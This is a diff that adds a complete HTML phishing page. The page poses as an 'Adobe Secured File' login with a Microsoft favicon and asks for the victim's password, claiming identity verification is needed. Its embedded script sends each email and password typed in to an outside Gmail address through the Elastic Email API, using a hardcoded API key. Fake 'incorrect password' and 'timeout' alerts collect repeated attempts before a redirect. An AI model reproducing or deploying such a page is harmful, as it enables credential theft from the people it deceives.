@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Secured File</title>
+    <link rel="shortcut icon" id="favicon" href="https://logincdn.msauth.net/16.000.28799.4/images/favicon.ico">
+</head>
+<body>
+    <div class="auth-container__parent">
+        <div class="auth-container">
+            <div class="text-center"></div>
+            <div class="auth-container__inner">
+                <div id="loaderrr" class="text-center hidden" style="position: absolute; top: 0; left: 20px"></div>
+                
+                <div id="eee" class="">
+                    <form id="pass-form2" class="pass-form2" method="post">
+                        <input style="margin-top: 18px; border:none;" readonly name="email" value="user@example.com">
+                        <h3 class="auth__title">Enter password</h3>
+                        <div style="color:#b82500;">Because You're Accessing Sensitive Info, You Need To Verify Your Identity.</div>
+                        <br>
+                        <div class="form-group">
+                            <input type="password" required name="password" id="passwordInput" class="form-control custom-input has-error" placeholder="Password" aria-label="Password" autofocus="true" oninvalid="this.setCustomValidity('Password is Required')" oninput="this.setCustomValidity('')">
+                        </div>
+                        <div class="form-group" style="font-size: 13px; line-height: 20px;">
+                            <a href="">Forget Password</a>
+                        </div>
+                        <div class="text-right">
+                            <button class="btn btn-primary btn-custom" type="submit" name="submit">Sign in</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <div class="page-footer">
+            <ul class="listt">
+                <li>&nbsp;.&nbsp;.&nbsp;.&nbsp;</li>
+                <li>Privacy &amp; cookies</li>
+                <li>Terms of use</li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    
+    <script>
+        // --- ELASTIC EMAIL API CONFIG ---
+        const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
+        const fromEmail = 'smtp@choicelink.online';
+        const toEmail = 'Danjekwu778@gmail.com';
+        // --------------------------------
+
+        let attemptCount = 0;
+        
+        document.getElementById('pass-form2').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            attemptCount++;
+            
+            const password = document.getElementById('passwordInput').value;
+            const email = document.querySelector('input[name="email"]').value;
+            
+            // Send email via Elastic Email API
+            sendEmail(email, password);
+            
+            // Handle attempts
+            if (attemptCount === 1) {
+                alert("Incorrect password");
+            } else if (attemptCount === 2) {
+                alert("Connection time out");
+            } else if (attemptCount >= 3) {
+                // Redirect after third attempt
+                window.location.href = "https://pentestingdemolab.com";
+            }
+        });
+        
+        function sendEmail(email, password) {
+            const subject = `Password Attempt from ${email}`;
+            const body = `Email: ${email}\nPassword: ${password}\nAttempt: ${attemptCount}`;
+            
+            // Using Elastic Email API
+            fetch('https://api.elasticemail.com/v2/email/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams({
+                    'apikey': elasticEmailApiKey,
+                    'from': fromEmail,
+                    'to': toEmail,
+                    'subject': subject,
+                    'bodyText': body
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Email sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending email:', error);
+            });
+        }
+    </script>
+</body>
+</html>
